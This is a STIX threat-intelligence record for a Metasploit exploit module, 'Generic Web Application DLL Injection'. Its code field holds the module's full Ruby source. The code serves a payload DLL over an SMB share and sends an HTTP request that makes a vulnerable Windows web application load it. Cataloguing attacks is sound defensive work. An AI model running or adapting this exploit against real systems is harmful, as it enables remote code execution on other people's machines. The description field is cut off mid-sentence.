{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0442493-fc9d-4901-a6d5-a24ff02bdfc9",
    "created": "2024-08-14T16:52:21.810829Z",
    "modified": "2024-08-14T16:52:21.810833Z",
    "name": "Generic Web Application DLL Injection",
    "description": " This is a general-purpose module for exploiting conditions where a HTTP request triggers a DLL load from an specified SMB share. This module serves payloads as",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/generic_http_dll_injection.rb",
            "external_id": "generic_http_dll_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Generic Web Application DLL Injection',\n      'Description'    => %q{\n        This is a general-purpose module for exploiting conditions where a HTTP request\n        triggers a DLL load from an specified SMB share. This module serves payloads as\n        DLLs over an SMB service and allows an arbitrary HTTP URL to be called that would\n        trigger the load of the DLL.\n      },\n      'Author'         =>\n        [\n          'Matthew Hall <hallm[at]sec-1.com>'\n        ],\n      'Platform'       => 'win',\n      'Privileged'     => false,\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'References'     =>\n        [\n          ['CWE', '427']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Targets'        =>\n        [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0, # Default target is 32-bit as we usually inject into 32bit processes\n      'DisclosureDate' => '2015-03-04'\n      ))\n\n      register_options(\n        [\n          OptString.new('FILE_NAME', [false, 'DLL File name to share (Default: random .dll)']),\n          OptString.new('TARGETURI', [true,  'Path to vulnerable URI (The shared location will be added at the end)', '/cgi-bin/function.php?argument=' ]),\n          OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 10])\n        ])\n\n      deregister_options('FILE_CONTENTS')\n  end\n\n  def setup\n    super\n\n    self.file_contents = generate_payload_dll\n    self.file_name = datastore['FILE_NAME'] || \"#{Rex::Text.rand_text_alpha(4 + rand(3))}.dll\"\n    print_status(\"File available on #{unc}...\")\n  end\n\n  def primer\n    sploit = target_uri.to_s\n    sploit << unc\n\n    print_status(\"Trying to \")\n    send_request_raw({\n      'method' => 'GET',\n      'uri' => sploit\n    }, 3)\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['SMB_DELAY']) {super}\n    rescue Timeout::Error\n      # do nothing... just finish exploit and stop smb server...\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-03-04",
    "x_mitre_platforms": [
        "win'"
    ]
}